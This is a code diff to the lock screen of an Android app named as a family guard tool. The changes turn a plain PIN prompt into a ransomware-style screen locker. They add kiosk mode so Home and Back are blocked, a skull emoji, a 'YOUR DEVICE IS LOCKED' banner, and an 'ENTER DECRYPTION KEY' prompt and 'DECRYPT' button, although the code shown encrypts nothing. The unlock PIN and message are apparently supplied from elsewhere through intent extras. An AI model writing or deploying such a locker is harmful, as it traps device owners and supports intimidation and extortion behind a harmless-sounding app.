@@ -1,7 +1,9 @@
 package com.family.guard;
 
 import android.app.Activity;
+import android.app.admin.DevicePolicyManager;
 import android.content.BroadcastReceiver;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
@@ -10,6 +12,8 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
+import android.view.Gravity;
+import android.view.View;
 import android.view.WindowManager;
 import android.widget.Button;
 import android.widget.EditText;
@@ -44,6 +48,9 @@ public class LockActivity extends Activity {
                              WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                              WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
 
+        // KIOSK MODE (Ngunci tombol Home/Back)
+        startLockTask();
+
         String msg = getIntent().getStringExtra("msg");
         String realPin = getIntent().getStringExtra("pin");
 
@@ -51,29 +58,39 @@ public class LockActivity extends Activity {
         layout.setOrientation(LinearLayout.VERTICAL);
         layout.setBackgroundColor(0xFF000000);
         layout.setPadding(50, 50, 50, 50);
-        layout.setGravity(android.view.Gravity.CENTER);
+        layout.setGravity(Gravity.CENTER);
+
+        TextView tvSkull = new TextView(this);
+        tvSkull.setText("💀");
+        tvSkull.setTextSize(100);
+        tvSkull.setGravity(Gravity.CENTER);
+        layout.addView(tvSkull);
 
         TextView tvMsg = new TextView(this);
-        tvMsg.setText(msg);
+        tvMsg.setText("YOUR DEVICE IS LOCKED\n\n" + msg);
         tvMsg.setTextColor(0xFFFF0000);
         tvMsg.setTextSize(24);
-        tvMsg.setGravity(android.view.Gravity.CENTER);
+        tvMsg.setGravity(Gravity.CENTER);
+        tvMsg.setPadding(0, 30, 0, 50);
         layout.addView(tvMsg);
 
         EditText etPin = new EditText(this);
-        etPin.setHint("Masukkan PIN");
+        etPin.setHint("ENTER DECRYPTION KEY");
         etPin.setInputType(android.text.InputType.TYPE_CLASS_NUMBER | android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD);
         etPin.setTextColor(0xFFFFFFFF);
         etPin.setHintTextColor(0xFF888888);
+        etPin.setGravity(Gravity.CENTER);
         layout.addView(etPin);
 
         Button btnUnlock = new Button(this);
-        btnUnlock.setText("BUKA KUNCI");
+        btnUnlock.setText("DECRYPT");
+        btnUnlock.setBackgroundColor(0xFFFF0000);
+        btnUnlock.setTextColor(0xFFFFFFFF);
         btnUnlock.setOnClickListener(v -> {
             if (etPin.getText().toString().equals(realPin)) {
                 finish();
             } else {
-                Toast.makeText(this, "PIN SALAH!", Toast.LENGTH_SHORT).show();
+                Toast.makeText(this, "INVALID KEY!", Toast.LENGTH_SHORT).show();
             }
         });
         layout.addView(btnUnlock);
